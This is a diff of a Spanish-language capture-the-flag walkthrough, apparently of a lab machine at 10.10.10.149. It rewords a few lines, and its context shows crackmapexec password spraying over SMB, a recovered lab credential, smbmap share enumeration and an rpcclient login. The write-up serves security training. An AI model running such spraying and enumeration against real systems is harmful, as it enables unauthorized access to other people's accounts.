@@ -57,7 +57,7 @@ El resultado sera:
 
 Colocamos todos los usuario en **user.txt** y los password en **pass.txt**
 
-Utilizaremos `crackmapexec` con los archivos **user.txt** y otro con los **pass.txt**
+Utilizaremos `crackmapexec` con los archivos **user.txt** y **pass.txt**
 ```
 crackmapexec smb 10.10.10.149 -u user.txt -p pass.txt
 ```
@@ -66,7 +66,7 @@ De los resultado de crackmapexec tenemos que:
 SUPPORTDESK [+] **SupportDesk\hazard:stealth1agent**
 
 
-Ahora utilizaremos **smbmap** para ver que nivel tenemos con el usuario **hazard**
+Ahora utilizaremos **smbmap** para ver que tipo de privilegios tenemos con **hazard**
 ```
 smbmap -H 10.10.10.149 -u hazard -p stealth1agent
 [+] Finding open SMB ports....
@@ -79,7 +79,7 @@ smbmap -H 10.10.10.149 -u hazard -p stealth1agent
 	IPC$                                      	READ ONLY
 ```
 
-Notamos que solo tenemos acceso **read only** remote ipc
+Notamos que solo tenemos acceso **read only** remote **IPC$**
 ```
 rpcclient -U 'hazard%stealth1agent' 10.10.10.149
 rpcclient $> lookupnames hazard
